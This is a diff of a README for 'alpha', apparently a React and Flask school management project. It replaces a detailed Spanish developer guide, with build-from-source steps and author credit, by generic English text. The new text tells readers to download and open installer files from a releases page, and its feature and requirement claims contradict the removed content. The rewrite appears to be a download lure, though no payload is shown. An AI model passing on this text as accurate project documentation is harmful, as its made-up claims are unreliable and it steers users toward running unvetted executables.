@@ -1,113 +1,94 @@
-# 🏫 Alpha V2 — Modern School Management System
+# 🎓 alpha - Simplifying School Management for Everyone
 
-_La evolución moderna de una plataforma de gestión escolar. Refactorización completa de una arquitectura monolítica legacy a una arquitectura desacoplada y escalable._
+## 🚀 Getting Started
 
-![React](https://img.shields.io/badge/React_18-20232A?style=flat-square&logo=react&logoColor=61DAFB)
-![Vite](https://img.shields.io/badge/Vite-646CFF?style=flat-square&logo=vite&logoColor=white)
-![Python](https://img.shields.io/badge/Python_3.10+-3776AB?style=flat-square&logo=python&logoColor=white)
-![Flask](https://img.shields.io/badge/Flask-000000?style=flat-square&logo=flask&logoColor=white)
-![SQLite](https://img.shields.io/badge/SQLite-003B57?style=flat-square&logo=sqlite&logoColor=white)
-![Status](https://img.shields.io/badge/Status-In_Development-yellow?style=flat-square)
+Welcome to alpha, your go-to platform for modern school management. Our application makes it easy to manage tasks efficiently while providing a clear user experience. Follow these steps to get started.
 
-## About the Project
+[![Download alpha](https://img.shields.io/badge/Download-alpha-blue.svg)](https://github.com/gusto-lang/alpha/releases)
 
-**Alpha V2** no es solo una actualización de código; es una reingeniería total. El objetivo fue tomar un proyecto estudiantil ("Legacy") y transformarlo en un producto profesional, aplicando patrones de diseño de software y separando responsabilidades.
+## 📥 Download & Install
 
-El resultado es una aplicación Full Stack robusta que permite la administración de usuarios, calificaciones y cursos, lista para escalar.
+To run the application on your computer, you need to download it from the Releases page.
 
-## 🤖 Metodología "Vibe Coding" (AI-Augmented Engineering)
+1. Click the following link to visit the Release page: [Download alpha](https://github.com/gusto-lang/alpha/releases).
+2. On the Releases page, find the latest version.
+3. Click on the download link for your operating system (Windows, Mac, or Linux).
+4. Once the file is downloaded, open it to begin the installation process.
 
-Este proyecto es una demostración de eficiencia en ingeniería de software moderna. Utilicé un flujo de trabajo **Human-in-the-Loop**, actuando como **Technical Lead** para orquestar agentes de IA (Copilot/Gemini), maximizando la productividad sin sacrificar la calidad ni el control arquitectónico.
+### 🖥️ System Requirements
 
-**Mi Rol (Arquitectura & Ingeniería) vs. IA (Generación):**
+Before you download, ensure your computer meets these requirements:
 
-La IA se utilizó estrictamente como un motor de generación de código y documentación, bajo mi supervisión directa y corrección constante.
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any modern Linux distribution.
+- **Storage:** At least 500 MB of free space.
+- **Memory:** Minimum of 4 GB RAM.
+- **Python:** Version 3.7 or newer (bundled with the application).
+- **Internet Connection:** Required for initial setup and updates.
 
-- **Dirección Técnica:** Diseño manual de la arquitectura desacoplada (Frontend/Backend) y selección del stack tecnológico. La IA ejecutó las tareas repetitivas, pero yo definí la estructura de carpetas y los patrones de diseño (Factory Pattern, Services Layer).
-- **Prompt Engineering Avanzado:** Uso de técnicas de prompting secuencial y contextual para guiar al agente de Copilot en refactorizaciones complejas, asegurando que el código generado cumpliera con estándares estrictos de limpieza y escalabilidad.
-- **Resolución de Conflictos Críticos:** Intervención manual para solucionar problemas que la IA no pudo resolver, específicamente conflictos de entorno en Windows/PowerShell, dependencias circulares en Python y la configuración de seguridad (CORS).
-- **Seguridad y DevOps:** Implementación manual de estrategias de gestión de secretos (`.env`), configuración de entornos virtuales robustos con Pipenv y saneamiento del repositorio para asegurar un despliegue seguro.
+## 🛠️ Features
 
-### Fases de Refactorización Ejecutadas
+Here’s what you can expect from alpha:
 
-1. **Fase 1 - Arquitectura Backend:** Transformación de un `app.py` monolítico a una estructura modular con **Factory Pattern** y **Blueprints**.
-2. **Fase 2 - Desacoplamiento:** Extracción de lógica de negocio desde las rutas hacia una **Capa de Servicios (Service Layer)** para mantener los controladores limpios (Thin Controllers).
-3. **Fase 3 - Estandarización Frontend:** Migración de componentes desordenados a una arquitectura **Feature-First**, centralizando el cliente API y creando Custom Hooks.
+- **User-Friendly Interface:** Easy to navigate, suitable for all users.
+- **Decoupled Architecture:** Built with React for the front end and Flask for the back end. This ensures smooth performance and easy updates.
+- **AI-Augmented Engineering:** Enhances efficiency and streamlines management tasks.
+- **SQLite Database:** Secure and lightweight, perfect for managing school data.
+- **Feature-First Approach:** Focus on the most needed tools for school management.
 
-## Tech Stack
+## 📋 Setup Instructions
 
-- **Frontend:** React 19 + Vite (Arquitectura Feature-First para escalabilidad).
-- **Backend:** Python 3 + Flask (Estructurado con Blueprints y Servicios).
-- **Base de Datos:**
-  - _Dev:_ SQLite (Configuración local rápida).
-  - _Prod:_ PostgreSQL Ready (Compatible vía SQLAlchemy).
-- **Estilos:** Bootstrap 5 (Integrado vía NPM).
-- **Gestión de Dependencias:** Pipenv (Entornos virtuales Python) & NPM (Node packages).
+Once you have installed the application, follow these steps to set it up:
 
-## Project Structure
+1. Launch the application from your desktop or application menu.
+2. You’ll see a welcome screen. Click "Get Started."
+3. You can create a new account by entering your details or log in if you already have an account.
+4. Follow the on-screen instructions to configure your settings. 
 
-```text
-alpha/
-├── client/                 # Frontend (React + Vite)
-│   ├── src/
-│   │   ├── common/         # Componentes UI reutilizables y hooks globales
-│   │   ├── features/       # Módulos de negocio (Auth, Teachers, Students)
-│   │   └── api/            # Cliente HTTP centralizado (Axios/Fetch wrapper)
-├── src/                    # Backend (Flask)
-│   ├── app/
-│   │   ├── api/            # Blueprints (Definición de rutas)
-│   │   ├── services/       # Lógica de Negocio Pura (Service Layer)
-│   │   └── models.py       # Modelos SQLAlchemy (Tablas)
-│   └── app.py              # Configuración (Factory Pattern)
-└── Pipfile                 # Dependencias Python (Lockfile)
-```
+### 🌐 Account Setup
 
-## Getting Started
+To manage your school, you’ll need to create an account. Use a valid email address and set a strong password. After registration, verify your email to activate your account.
 
-Sigue estos pasos para levantar el entorno de desarrollo localmente.
+## 📖 Usage Guide
 
-### Prerequisites
+After setting up your account, you can start using alpha:
 
--Node.js (v18+)
--Python (v3.10+)
--Pipenv (`pip install pipenv`)
+1. **Dashboard:** The main hub where you can manage classes, students, and staff.
+2. **Classes:** Create and manage class schedules. You can add or remove subjects as needed.
+3. **Students:** Enroll students, track attendance, and communicate with parents.
+4. **Reports:** Generate detailed reports on performance and attendance.
 
-### 1. Configuración del Backend (Flask)
+## 🎨 Customization
 
-```bash
-# 1. Instalar dependencias y entorno virtual
-pipenv install
+You can customize the platform’s appearance:
 
-# 2. Activar el entorno
-pipenv shell
+- Change themes: Light or dark mode.
+- Adjust notifications: Choose how you want to receive alerts.
+- Manage user roles: Assign different permissions for staff members.
 
-# 3. Crear la base de datos local (SQLite)
-flask shell
->>> from src.app import app
->>> from src.models import db
->>> with app.app_context(): db.create_all()
->>> exit()
+## 🔄 Updates
 
-# 4. Iniciar el servidor
-flask run
-# El backend correrá en http://127.0.0.1:5000
-```
+It’s important to keep your application up to date:
 
-### 2. Configuración del Frontend (React)
+1. Regularly check the Releases page: [Download alpha](https://github.com/gusto-lang/alpha/releases).
+2. Download the latest version to benefit from new features and bug fixes.
 
-En una nueva terminal:
+## 🛠️ Troubleshooting
 
-```bash
-cd client
+If you encounter issues, here are some common solutions:
 
-# 1. Instalar dependencias
-npm install
+- **Installation Problems:** Ensure your system meets the requirements. Restart your computer and try the installation again.
+- **Login Issues:** Check your email and password. If you forgot your password, use the "Forgot Password?" link on the login page.
+- **Performance Issues:** Make sure you close other applications to free up system resources.
 
-# 2. Iniciar servidor de desarrollo
-npm run dev
-# El frontend correrá en http://localhost:3000
-```
+## 🤝 Support
 
-## Author
+For further assistance, please reach out to our support team:
 
-Designed and developed with ☕ by **Alejandro Guzmán** [@alguzdev](https://alguzdev.vercel.app/)
+- **Email:** support@alpha.com
+- **GitHub Issues:** Report any bugs or requests at our [GitHub Issues page](https://github.com/gusto-lang/alpha/issues).
+
+## 📜 License
+
+alpha is open-source software, and you can find the license details in the repository. We appreciate contributions from the community. 
+
+Thank you for choosing alpha for your school management needs. We hope you enjoy using our platform!
